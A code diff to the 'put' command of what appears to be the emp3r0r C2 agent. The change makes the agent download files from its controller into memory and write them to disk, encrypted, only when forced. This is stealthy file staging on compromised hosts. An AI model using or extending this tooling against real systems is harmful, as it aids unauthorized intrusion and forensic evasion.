@@ -8,7 +8,6 @@ import (
 	"strings"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
-	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/cobra"
@@ -73,49 +72,64 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 	size, _ := cmd.Flags().GetInt64("size")
 	origChecksum, _ := cmd.Flags().GetString("checksum")
 	downloadAddr, _ := cmd.Flags().GetString("addr")
-	saveToMem, _ := cmd.Flags().GetBool("mem")
+	// saveToMem flag is deprecated in logic, we infer from path or default to auto
+	// saveToMem, _ := cmd.Flags().GetBool("mem")
+	force, _ := cmd.Flags().GetBool("force")
 
 	if fileName == "" || destPath == "" || size == 0 {
 		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("args error: %v", args))
 		return
 	}
 
-	// Memory storage handling
-	if saveToMem {
-		logging.Printf("putCmdRun: saving %s to memory", fileName)
-		data, err := c2transport.FetchFile(downloadAddr, fileName, "", origChecksum)
-		if err != nil {
-			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download to memory %s: %v", fileName, err))
-			return
-		}
+	// Download to memory buffer first
+	logging.Printf("putCmdRun: downloading %s to memory buffer", fileName)
+	data, err := c2transport.FetchFile(downloadAddr, fileName, "", origChecksum)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download to memory buffer %s: %v", fileName, err))
+		return
+	}
 
-		err = util.SaveFileAgent(destPath, data, 0o600, util.StorageMemory)
-		if err != nil {
+	// Try to save with Auto strategy (defaults to memory if small enough)
+	// If path implies memory (mem://), it will enforce memory.
+	err = util.SaveFileAgent(destPath, data, 0o600, util.StorageAuto)
+	if err != nil {
+		// Failed (likely Auto tried memory and failed, or disk failed)
+		// We only retry to Disk if --force is present AND the initial attempt wasn't explicitly mem://
+		if strings.HasPrefix(destPath, "mem://") {
 			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to save to memory %s: %v", destPath, err))
 			return
 		}
-		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("%s uploaded to memory, sha256sum: %s", destPath, origChecksum))
-		return
+
+		if !force {
+			c2transport.NotifyC2(cmd, "Error: Memory unavailable and --force not specified. File not saved.\nUse --force to write to disk (encrypted).")
+			return
+		}
+
+		// Force disk
+		err = util.SaveFileAgent(destPath, data, 0o600, util.StorageDisk)
+		if err != nil {
+			c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to force save to disk %s: %v", destPath, err))
+			return
+		}
 	}
 
-	// Disk storage handling
-	_, err := c2transport.FetchFile(downloadAddr, fileName, destPath, origChecksum)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: failed to download %s: %v", fileName, err))
-		return
-	}
-	// Calculate checksum from saved file (memory or disk)
-	fileData, err := util.ReadFileAgent(destPath)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "%s", fmt.Sprintf("put: checksum failed, cannot read %s: %v", destPath, err))
-		return
-	}
-	checksum := crypto.SHA256SumRaw(fileData)
+	// Success
+	msg := fmt.Sprintf("%s uploaded, sha256sum: %s", destPath, origChecksum)
 
-	downloadedSize := util.FileSize(destPath)
-	resp := fmt.Sprintf("%s uploaded, sha256sum: %s", destPath, checksum)
-	if downloadedSize < size {
-		resp = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nRun `put` again to resume", downloadedSize, size, checksum)
+	// Check where it went
+	if util.IsFileExist(destPath) {
+		// Check if it's in memory map
+		isMem := false
+		util.MemFileLock.RLock()
+		_, isMem = util.MemFileMap[destPath]
+		util.MemFileLock.RUnlock()
+
+		if isMem {
+			msg += "\n\nFile saved to memory. Use `cp` or `mv` to move to disk if needed."
+		} else {
+			msg += "\n\nFile saved to DISK (encrypted)."
+		}
 	}
-	c2transport.NotifyC2(cmd, "%s", resp)
+
+	c2transport.NotifyC2(cmd, "%s", msg)
 }
